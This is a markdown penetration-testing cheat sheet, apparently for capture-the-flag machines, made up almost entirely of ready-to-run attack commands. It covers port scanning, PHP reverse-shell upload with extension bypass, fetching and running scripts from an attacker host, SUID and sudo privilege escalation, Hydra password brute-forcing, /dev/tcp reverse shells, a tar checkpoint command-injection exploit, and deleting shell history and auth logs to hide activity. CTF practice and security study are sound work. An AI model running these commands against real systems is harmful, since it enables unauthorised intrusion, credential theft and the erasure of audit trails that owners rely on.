# 🔍 Recon & Enumeration

## Basic Scan
```bash
nmap <TARGET_IP>
```

## Full Port Scan
```bash
nmap -p- <TARGET_IP>
```

## Version + Script
```bash
nmap -sC -sV <TARGET_IP>
```

## Aggressive Scan
```bash
nmap -A <TARGET_IP>
```

## Find User or Root Flags
```bash
# 2>/dev/null hides permission denied errors
find / -type f -name user.txt 2>/dev/null
find / -type f -name root.txt 2>/dev/null
```

# 🆕 🐚 Reverse Shells & File Uploads

- Copy and Rename PHP Reverse Shell
### On Attacker Machine
```bash
# Kali Linux default path
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
nano shell.php  # Edit $ip (Attacker IP) and $port
```

## Start Listener
### On Attacker Machine
```bash
# -l: listen, -v: verbose, -n: no dns, -p: port
nc -lvnp 4444
```

## Upload via form or RFI
### On Victim Machine
If extension is filtered:
```bash
cp shell.php shell.phtml
cp shell.php shell.php5
```

# 💣 Privilege Escalation

## Check Sudo Permissions
### On Victim Machine
```bash
sudo -l
```

## Common PrivEsc Tools
### On Attacker Machine
```bash
python3 -m http.server 8000
```

### On Victim Machine
```bash
wget http://<ATTACKER_IP>:8000/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh
```

## GTFOBins - Using less
### On Victim Machine
```bash
sudo less /etc/profile
# Press `v` to open in editor
# Add: `!/bin/bash`, save & exit
```

## SUID Bit Binaries
### On Victim Machine
```bash
find / -perm -4000 2>/dev/null
```

## Bash with SUID
### On Victim Machine
```bash
/tmp/bash -p
```

## Python SUID Exploit
### On Victim Machine
```bash
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

# 📂 Web Directory Brute-Forcing (Gobuster)

## Basic Dir Busting
### On Attacker Machine
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

## With Extensions
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

## Recursive
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -r
```

# 🆕 🐟 FTP / SMB

## FTP

### Connect
```bash
ftp <TARGET_IP>
```

### Login as anonymous
```text
Name: anonymous
Password: (blank)
```

### Get file
```bash
get <FILENAME>
```

### Hydra FTP
```bash
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
```

## SMB

### List Shares (Anon)
```bash
smbclient -L //<TARGET_IP>/ -N
```

### Connect to Share
```bash
smbclient //<TARGET_IP>/<SHARE_NAME> -N
```

### SMB with Login
```bash
smbclient //<TARGET_IP>/<SHARE_NAME> -U <USERNAME>
```

# 🔐 Hydra Login Attacks

## SSH
```bash
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
```

## HTTP Basic
```bash
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get /protected-path
```

## HTTP POST Form
```bash
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

## FTP
```bash
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
```

## SMB
```bash
hydra -L users.txt -P passwords.txt smb://<TARGET_IP>
```

# 🧠 Steganography & Image Metadata

## Exif metadata
```bash
exiftool <IMAGE_FILE>
```

## Strings in file
```bash
strings <IMAGE_FILE> | less
```

## Steghide extract
```bash
steghide extract -sf <IMAGE_FILE>
```

## Stegseek (if installed)
```bash
stegseek <IMAGE_FILE> /usr/share/wordlists/rockyou.txt
```

# 🆕 🧰 Handy Extras

## SCP - Copy from remote
```bash
scp <USERNAME>@<TARGET_IP>:/path/to/file .
```

## SSH into machine
```bash
ssh <USERNAME>@<TARGET_IP>
```

## Bash with interactive shell
### On Victim Machine
```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

# 🧼 Cleanup & Sanity

## Remove .bash_history if you rooted
### On Victim Machine
```bash
rm ~/.bash_history
history -c
```

## Clear logs (optional, depending on ethics rules)
```bash
> /var/log/auth.log
```

# 🆕 Add-on Tip: File Checkpoints for RCE (tar)

## Exploit tar with checkpoint injection
### On Victim Machine
```bash
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```

### shell.sh content
```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > shell.sh
```

# Port → Service → Tools → Notes

| Port | Service | Tools | Notes |
|------|---------|-------|-------|
| 445 | SMB | smbclient, enum4linux, crackmapexec | |
| 80/443 | HTTP(S) | gobuster, nikto, ffuf, burpsuite | |
| 22 | SSH | hydra, ssh2john, brute-force with rockyou | |
